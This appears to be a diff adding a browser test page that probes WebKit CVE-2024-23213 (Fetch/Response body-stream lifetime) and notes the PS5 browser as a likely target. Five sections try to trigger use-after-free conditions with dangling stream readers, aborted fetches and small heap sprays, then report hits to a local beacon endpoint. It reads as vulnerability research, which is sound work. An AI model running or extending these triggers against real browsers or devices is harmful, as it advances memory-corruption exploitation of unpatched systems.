@@ -1,0 +1,281 @@
+<!--
+  p689: CVE-2024-23213 -- Fetch/Response body stream lifetime confusion
+
+  CVE-2024-23213: "The issue was addressed with improved memory handling."
+  Fixed in Safari 17.3. Present in 17.0 (605.1.15). PS5 LIKELY VULNERABLE.
+
+  Patterns tested:
+  A) Response.clone() then consume original -- does clone's body get freed?
+  B) ReadableStream reader lock then Response goes out of scope
+  C) Response.body piped through TransformStream with original dropped
+  D) Rapid fetch abort during body read -- AbortController + reader
+  E) Blob/ArrayBuffer body consumed through multiple paths simultaneously
+
+  CRASH_CLASS: MODERATE (stale buffer pointer in stream reader)
+  prior art: p601 (JS features inventory), p605 (WebKit features)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>p689</title></head>
+<body><pre id="out">p689: Fetch/Response body stream lifetime (CVE-2024-23213)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+var _sid='p689-'+Date.now();
+function say(s){O.textContent+='\n'+s;}
+function b(m){
+  say(m);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('POST','/api/beacon',false);
+    x.setRequestHeader('Content-Type','application/json');
+    x.send(JSON.stringify({stage:'p689',msg:m,level:'info',sid:_sid,ua:navigator.userAgent}));
+  }catch(e){
+    try{new Image().src='/beacon?m='+encodeURIComponent(m)+'&t='+Date.now();}catch(e2){}
+  }
+}
+
+function main(){
+  b('P689-START:CVE-2024-23213-FETCH-BODY-LIFETIME');
+  var results = [];
+  var done = 0;
+  var total = 5;
+
+  function checkDone() {
+    done++;
+    if (done >= total) {
+      if (results.length > 0) {
+        b('P689-RESULT:HITS=' + results.join(';'));
+      } else {
+        b('P689-RESULT:NO-UAF-DETECTED');
+      }
+      b('P689-DONE');
+    }
+  }
+
+  // === SECTION A: Response.clone() body lifetime ===
+  b('A:CLONE-BODY');
+  try {
+    // Create a large response with body
+    var bigData = new Uint8Array(65536);
+    for (var i = 0; i < bigData.length; i++) bigData[i] = i & 0xFF;
+
+    var resp = new Response(bigData.buffer);
+    var clone = resp.clone();
+
+    // Consume original
+    resp.arrayBuffer().then(function(buf1) {
+      b('A:ORIGINAL-SIZE:' + buf1.byteLength);
+
+      // Force GC
+      resp = null;
+      for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+
+      // Now consume clone -- original's buffer should be freed
+      return clone.arrayBuffer();
+    }).then(function(buf2) {
+      b('A:CLONE-SIZE:' + buf2.byteLength);
+
+      // Verify data integrity
+      var view = new Uint8Array(buf2);
+      var ok = true;
+      for (var i = 0; i < 256; i++) {
+        if (view[i] !== (i & 0xFF)) { ok = false; break; }
+      }
+      b('A:DATA-OK:' + ok);
+      if (!ok) {
+        b('A:DATA-CORRUPTED');
+        results.push('A:corruption');
+      }
+      checkDone();
+    }).catch(function(e) {
+      b('A:ERR:' + e.message);
+      checkDone();
+    });
+  } catch(e) {
+    b('A:SYNC-ERR:' + e.message);
+    checkDone();
+  }
+
+  // === SECTION B: Reader lock outliving Response ===
+  b('B:READER-OUTLIVE');
+  try {
+    var resp2 = new Response(new Blob([new ArrayBuffer(32768)]));
+    var reader = resp2.body.getReader();
+
+    // Drop response reference
+    resp2 = null;
+
+    // Force GC
+    for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+    var spray = [];
+    for (var i = 0; i < 1024; i++) spray.push(new ArrayBuffer(32));
+
+    // Try to read through the reader -- Response is gone
+    var chunks = [];
+    function pump() {
+      return reader.read().then(function(result) {
+        if (result.done) {
+          var totalSize = 0;
+          for (var i = 0; i < chunks.length; i++) totalSize += chunks[i].byteLength;
+          b('B:TOTAL-READ:' + totalSize);
+          checkDone();
+          return;
+        }
+        chunks.push(result.value);
+
+        // GC between reads
+        for (var i = 0; i < 500; i++) new ArrayBuffer(1024);
+
+        return pump();
+      });
+    }
+    pump().catch(function(e) {
+      b('B:PUMP-ERR:' + e.message);
+      results.push('B:err');
+      checkDone();
+    });
+  } catch(e) {
+    b('B:SYNC-ERR:' + e.message);
+    checkDone();
+  }
+
+  // === SECTION C: Piped through TransformStream ===
+  b('C:TRANSFORM-PIPE');
+  try {
+    if (typeof TransformStream !== 'undefined') {
+      var data3 = new Uint8Array(16384);
+      for (var i = 0; i < data3.length; i++) data3[i] = 0xAA;
+
+      var resp3 = new Response(data3.buffer);
+      var ts = new TransformStream();
+      var pipePromise = resp3.body.pipeTo(ts.writable);
+
+      // Drop response
+      resp3 = null;
+
+      // Force GC
+      for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+
+      // Read from readable side
+      var reader3 = ts.readable.getReader();
+      var totalRead = 0;
+      function pump3() {
+        return reader3.read().then(function(result) {
+          if (result.done) {
+            b('C:PIPE-TOTAL:' + totalRead);
+            checkDone();
+            return;
+          }
+          totalRead += result.value.byteLength;
+
+          // Check data integrity
+          var v = new Uint8Array(result.value.buffer);
+          for (var j = 0; j < Math.min(v.length, 16); j++) {
+            if (v[j] !== 0xAA) {
+              b('C:PIPE-CORRUPT:offset=' + j + ',val=' + v[j]);
+              results.push('C:corruption');
+              break;
+            }
+          }
+          return pump3();
+        });
+      }
+      pump3().catch(function(e) {
+        b('C:PIPE-ERR:' + e.message);
+        checkDone();
+      });
+    } else {
+      b('C:NO-TRANSFORMSTREAM');
+      checkDone();
+    }
+  } catch(e) {
+    b('C:SYNC-ERR:' + e.message);
+    checkDone();
+  }
+
+  // === SECTION D: Rapid abort during body read ===
+  b('D:ABORT-DURING-READ');
+  try {
+    // Create a self-referencing fetch via data URL
+    var bigPayload = '';
+    for (var i = 0; i < 1000; i++) bigPayload += 'AAAA';
+    var dataUrl = 'data:application/octet-stream;base64,' + btoa(bigPayload);
+
+    var ac = new AbortController();
+    fetch(dataUrl, { signal: ac.signal }).then(function(resp4) {
+      var reader4 = resp4.body.getReader();
+
+      // Start reading
+      reader4.read().then(function(result) {
+        b('D:FIRST-CHUNK:' + (result.value ? result.value.byteLength : 'done'));
+      }).catch(function(e) {
+        b('D:READ-AFTER-ABORT:' + e.message);
+      });
+
+      // Abort immediately
+      ac.abort();
+      b('D:ABORTED');
+
+      // GC + spray
+      for (var i = 0; i < 3000; i++) new ArrayBuffer(1024);
+
+      // Try to read again after abort
+      reader4.read().then(function(result2) {
+        b('D:POST-ABORT-READ:done=' + result2.done);
+        checkDone();
+      }).catch(function(e) {
+        b('D:POST-ABORT-ERR:' + e.message);
+        checkDone();
+      });
+    }).catch(function(e) {
+      b('D:FETCH-ERR:' + e.message);
+      checkDone();
+    });
+  } catch(e) {
+    b('D:SYNC-ERR:' + e.message);
+    checkDone();
+  }
+
+  // === SECTION E: Blob consumed through multiple paths ===
+  b('E:BLOB-MULTI-CONSUME');
+  try {
+    var blob = new Blob([new ArrayBuffer(8192), new ArrayBuffer(8192)]);
+    var resp5 = new Response(blob);
+
+    // Start both arrayBuffer() and text() on the same blob
+    // One should fail (body already consumed), but we want to see if
+    // the underlying data gets freed while the other is still reading
+    var p1 = resp5.arrayBuffer();
+    var p2 = null;
+    try {
+      p2 = resp5.text();
+    } catch(e2) {
+      b('E:SECOND-CONSUME-BLOCKED:' + e2.message);
+    }
+
+    if (p2) {
+      Promise.all([p1, p2]).then(function(vals) {
+        b('E:BOTH-OK:ab=' + vals[0].byteLength + ',text=' + vals[1].length);
+        checkDone();
+      }).catch(function(e) {
+        b('E:MULTI-ERR:' + e.message);
+        checkDone();
+      });
+    } else {
+      p1.then(function(buf) {
+        b('E:SINGLE-OK:' + buf.byteLength);
+        checkDone();
+      }).catch(function(e) {
+        b('E:SINGLE-ERR:' + e.message);
+        checkDone();
+      });
+    }
+  } catch(e) {
+    b('E:SYNC-ERR:' + e.message);
+    checkDone();
+  }
+}
+
+setTimeout(main, 200);
+</script></body></html>
